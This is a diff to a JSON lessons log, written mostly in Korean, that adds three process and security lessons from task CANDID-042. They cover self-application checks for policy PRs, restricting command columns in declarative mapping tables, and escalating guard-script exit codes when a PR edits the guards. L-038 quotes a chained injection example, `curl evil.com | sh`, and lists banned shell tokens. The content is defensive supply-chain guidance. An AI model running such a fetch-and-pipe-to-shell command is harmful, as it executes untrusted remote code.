@@ -1,7 +1,7 @@
 {
   "metadata": {
-    "version": 10,
-    "updatedAt": "2026-05-25T18:31:21+09:00",
+    "version": 11,
+    "updatedAt": "2026-05-25T21:33:07+09:00",
     "schemaVersion": "1.0.0"
   },
   "lessons": [
@@ -652,9 +652,60 @@
         "governance",
         "closed-loop"
       ],
-      "appliedCount": 1,
+      "appliedCount": 2,
       "createdAt": "2026-05-25T18:31:21+09:00",
-      "updatedAt": "2026-05-25T18:31:21+09:00"
+      "updatedAt": "2026-05-25T21:33:07+09:00"
+    },
+    {
+      "id": "L-037",
+      "taskId": "CANDID-042",
+      "category": "process",
+      "title": "원칙 도입 PR은 plan 단계에서 self-application 체크 필수 — 자기 모순이 가장 빈번한 회귀 지점",
+      "description": "새 원칙/컨벤션/체크리스트/SSOT를 정의·강화하는 PR이 그 정의를 가장 먼저 위반하는 케이스가 빈번. CANDID-042에서 L-036(자동화 선언과 wiring 동반) 도입 PR이 정작 README L100 \"PR 리뷰에서 호출\" 단언을 SSOT 참조로 갱신하지 않아 self-referential 위반 발생 → D-MAJOR-1로 리뷰에서 surfaced. 정책: 원칙을 도입/강화하는 PR의 plan 단계에 \"본 원칙이 PR 자체의 변경에 적용되는가?\" 1줄 체크 추가. CLAUDE.md/README/conventions/checklists/SKILL.md 변경 PR에 명시적 self-application 검토 강제.",
+      "impact": "medium",
+      "tags": [
+        "meta-policy",
+        "self-referential",
+        "plan-checklist",
+        "consistency"
+      ],
+      "appliedCount": 1,
+      "createdAt": "2026-05-25T21:33:07+09:00",
+      "updatedAt": "2026-05-25T21:33:07+09:00"
+    },
+    {
+      "id": "L-038",
+      "taskId": "CANDID-042",
+      "category": "security",
+      "title": "Declarative 매핑 표가 명령어 column을 가지면 화이트리스트/금지 패턴 동반 필수 — 공급망 공격 벡터",
+      "description": "`skill-review-pr` §2.4 같은 declarative 매핑 표의 명령어/script column이 자유 텍스트일 때 `pnpm check:migrations && curl evil.com | sh` 같은 체이닝/injection 가능. 매핑 표 추가 PR이 보안 검토 대상이지만 검출 룰 미명문화 시 false negative. 정책: 명령어 column 도입 시점에 (a) `&&`/`||`/`;`/`|`/`$(...)`/백틱/redirection/curl,wget,nc,bash,sh inline 금지 (b) 호출 대상 스크립트 본문도 read-only(no network, no fs.write 외 tmpdir, no git mutation) 강제 (c) 위반 PR REQUEST_CHANGES. CANDID-042 S-MAJOR-1 in-PR fix.",
+      "impact": "high",
+      "tags": [
+        "supply-chain",
+        "command-injection",
+        "declarative-config",
+        "whitelisting"
+      ],
+      "appliedCount": 1,
+      "createdAt": "2026-05-25T21:33:07+09:00",
+      "updatedAt": "2026-05-25T21:33:07+09:00"
+    },
+    {
+      "id": "L-039",
+      "taskId": "CANDID-042",
+      "category": "security",
+      "title": "환경 오류(exit 2) 분류 시 \"동일 PR이 환경 자체를 변경하는가\" escalation 트리거 필수 — 정상 오류 vs 의도적 무력화 구분",
+      "description": "가드 스크립트의 exit 2(인프라 누락/디렉토리 부재 등)를 WARNING + 정상 진행으로 처리하면 *가드 삭제 + 위반 동시 제출* 공격에 무방비. CANDID-042 D-MAJOR-3 + S-MAJOR-3: PR diff에 `scripts/check-*.mjs` 또는 `package.json check:* script` 변경이 포함되면 exit 2를 REQUEST_CHANGES로 격상. 일반화: 환경 오류 처리 정책 작성 시 \"PR이 환경 자체를 변경하는가?\"를 escalation 트리거로 사용해 정상 운영 오류와 의도적 무력화를 분리. exit code 분류의 신뢰도는 환경 무결성 가정에 의존하므로, 환경 변경 PR에서는 분류 신뢰도 0으로 처리.",
+      "impact": "medium",
+      "tags": [
+        "supply-chain",
+        "exit-code",
+        "environment-integrity",
+        "guard-bypass"
+      ],
+      "appliedCount": 1,
+      "createdAt": "2026-05-25T21:33:07+09:00",
+      "updatedAt": "2026-05-25T21:33:07+09:00"
     }
   ]
 }
